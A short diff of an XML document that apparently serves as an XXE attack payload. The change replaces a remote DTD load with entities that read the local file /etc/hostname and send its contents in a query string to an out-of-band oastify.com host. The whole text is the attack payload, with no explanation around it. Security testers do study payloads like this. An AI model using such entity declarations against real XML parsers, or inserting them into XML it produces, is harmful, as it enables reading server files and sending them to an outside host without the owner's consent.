@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY % remote SYSTEM "http://5hnxmy5gwfnox9u7lgrtli34qvwmkc81.oastify.com/evil.dtd">
-  %remote;
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY exfil SYSTEM "http://5hnxmy5gwfnox9u7lgrtli34qvwmkc81.oastify.com/?data=%file;">
 ]>
 <contacts>
     <contact>
